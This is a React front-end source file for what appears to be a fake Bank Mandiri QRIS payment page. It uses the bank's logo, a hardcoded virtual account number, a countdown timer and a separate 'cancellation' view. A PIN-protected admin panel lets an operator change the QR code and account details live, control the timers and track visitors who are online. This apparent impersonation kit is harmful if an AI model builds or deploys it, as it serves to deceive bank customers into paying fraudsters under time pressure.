import React, { useEffect, useState } from "react";
import { AppState } from "./types";
import UserView from "./components/UserView";
import PINScreen from "./components/PINScreen";
import AdminPanel from "./components/AdminPanel";
import BatalView from "./components/BatalView";

// Generate or retrieve a persistent session identifier
const getSessionId = (): string => {
  let sid = localStorage.getItem("mandiri_session_id");
  if (!sid) {
    sid = "user_" + Math.random().toString(36).substring(2, 15);
    localStorage.setItem("mandiri_session_id", sid);
  }
  return sid;
};

export default function App() {
  const [view, setView] = useState<"user" | "batal" | "pin" | "admin">("user");
  const [adminPin, setAdminPin] = useState<string>("");
  const [state, setState] = useState<AppState>({
    qrImageUrl: "https://mssq.me/Ganti-gambar",
    useCustomText: false,
    qrCustomText: "https://bmri.id/bayar-qris",
    initialTime: 300,
    timeLeft: 300,
    isTimerRunning: true,
    audioUrl: "https://image2url.com/r2/bucket3/audio/1768021986386-da3b008e-d598-47eb-8175-33990bd1ac34.m4a",
    isExpired: false,
    logoUrl: "https://mediate.co.id/wp-content/uploads/2020/12/Bank_Mandiri_logo.png",
    statusMessage: "SISA WAKTU",
    virtualAccount: "70014080808",
  });

  const sessionId = getSessionId();

  // 1. Detect Path on Mount to separate into User, Batal, vs Admin views
  useEffect(() => {
    const path = window.location.pathname;
    if (path === "/admin" || path === "/admin/") {
      const savedPin = sessionStorage.getItem("mandiri_admin_token");
      if (savedPin) {
        setAdminPin(savedPin);
        setView("admin");
      } else {
        setView("pin");
      }
    } else if (path === "/batal" || path === "/batal/" || path === "/pembatalan" || path === "/pembatalan/") {
      setView("batal");
    } else {
      setView("user");
    }
  }, []);

  // 2. Fetch State on Mount and poll for live updates
  useEffect(() => {
    const fetchState = async () => {
      try {
        const res = await fetch("/api/state?poll=true");
        if (res.ok) {
          const data = await res.json();
          setState(data);
        }
      } catch (err) {
        console.error("Failed to sync state with server:", err);
      }
    };

    fetchState();
    const stateInterval = setInterval(fetchState, 1000); // 1s interval for precision countdown
    return () => clearInterval(stateInterval);
  }, []);

  // 3. Send Heartbeats to server to track online users/admins
  useEffect(() => {
    const sendHeartbeat = async () => {
      try {
        await fetch("/api/heartbeat", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            sessionId,
            pageType: view === "admin" ? "admin" : "user",
          }),
        });
      } catch (err) {
        console.error("Heartbeat sync failed:", err);
      }
    };

    sendHeartbeat();
    const heartbeatInterval = setInterval(sendHeartbeat, 3000);
    return () => clearInterval(heartbeatInterval);
  }, [sessionId, view]);

  // Action: Verify PIN from login screen
  const handleVerifyPIN = async (pin: string): Promise<boolean> => {
    try {
      const res = await fetch("/api/verify-pin", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({ pin }),
      });

      if (res.ok) {
        const data = await res.json();
        if (data.success) {
          setAdminPin(pin);
          sessionStorage.setItem("mandiri_admin_token", pin);
          setView("admin");
          return true;
        }
      }
      return false;
    } catch (err) {
      console.error("PIN verification error:", err);
      return false;
    }
  };

  // Action: Update state configs (Admin only)
  const handleUpdateState = async (updates: Partial<AppState> & { adminPin?: string }): Promise<boolean> => {
    try {
      const res = await fetch("/api/state", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-admin-pin": adminPin,
        },
        body: JSON.stringify({ updates }),
      });

      if (res.ok) {
        const data = await res.json();
        if (data.success) {
          // If the admin pin itself was updated, keep our local session token synced
          if (updates.adminPin) {
            setAdminPin(updates.adminPin);
            sessionStorage.setItem("mandiri_admin_token", updates.adminPin);
          }
          return true;
        }
      }
      return false;
    } catch (err) {
      console.error("Failed to update configurations:", err);
      return false;
    }
  };

  // Action: Reset timer back to its initial time
  const handleResetTimer = async (target: "user" | "batal" = "user"): Promise<boolean> => {
    try {
      const res = await fetch(`/api/reset-timer?target=${target}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-admin-pin": adminPin,
        },
      });
      return res.ok;
    } catch (err) {
      console.error("Failed to reset timer:", err);
      return false;
    }
  };

  // Action: Toggle countdown run/pause state
  const handleToggleTimer = async (target: "user" | "batal" = "user"): Promise<boolean> => {
    try {
      const res = await fetch(`/api/toggle-timer?target=${target}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-admin-pin": adminPin,
        },
      });
      return res.ok;
    } catch (err) {
      console.error("Failed to toggle timer:", err);
      return false;
    }
  };

  // Action: Instantly trigger time expired / reactivation
  const handleToggleExpire = async (target: "user" | "batal" = "user"): Promise<boolean> => {
    try {
      const res = await fetch(`/api/toggle-expire?target=${target}`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "x-admin-pin": adminPin,
        },
      });
      return res.ok;
    } catch (err) {
      console.error("Failed to toggle expiration status:", err);
      return false;
    }
  };

  // Action: Logout from admin panel
  const handleLogout = () => {
    setAdminPin("");
    sessionStorage.removeItem("mandiri_admin_token");
    window.location.href = "/";
  };

  // Router dispatcher
  if (view === "admin") {
    return (
      <AdminPanel
        state={state}
        adminPin={adminPin}
        onUpdateState={handleUpdateState}
        onResetTimer={handleResetTimer}
        onToggleTimer={handleToggleTimer}
        onToggleExpire={handleToggleExpire}
        onLogout={handleLogout}
      />
    );
  }

  if (view === "pin") {
    return (
      <PINScreen
        onVerify={handleVerifyPIN}
        onCancel={() => {
          window.location.href = "/";
        }}
      />
    );
  }

  if (view === "batal") {
    return (
      <BatalView
        state={state}
      />
    );
  }

  return (
    <UserView
      state={state}
      onNavigateToAdmin={() => {
        window.history.pushState({}, "", "/admin");
        setView("pin");
      }}
    />
  );
}
